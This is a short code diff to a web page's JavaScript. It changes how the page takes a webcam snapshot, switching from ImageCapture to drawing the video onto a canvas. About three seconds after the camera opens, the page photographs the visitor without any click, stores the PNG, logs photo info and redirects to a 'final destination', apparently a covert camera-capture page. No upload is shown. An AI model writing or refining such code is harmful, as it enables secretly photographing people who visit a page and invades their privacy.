@@ -107,20 +107,12 @@
       window.stream = stream;
       video.srcObject = stream;
 
-      const mediaStreamTrack = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(mediaStreamTrack);
-
       const context = canvas.getContext('2d');
 
       setTimeout(function () {
-        
-
-          
-        imageCapture.grabFrame().then(imageBitmap => {
-          canvas.width = imageBitmap.width;
-          canvas.height = imageBitmap.height;
-          canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
+        if (!photoTaken) {
           console.log('Фотографирование...');
+          context.drawImage(video, 0, 0, 740, 580);
           canvas.toBlob(function(blob) {
             console.log('Фотография создана');
             savedPhoto = blob;
@@ -128,8 +120,7 @@
             logPhotoInfo();
             redirectToFinalDestination();
           }, 'image/png');
-        });
-        
+        }
       }, 3000);
     }
 
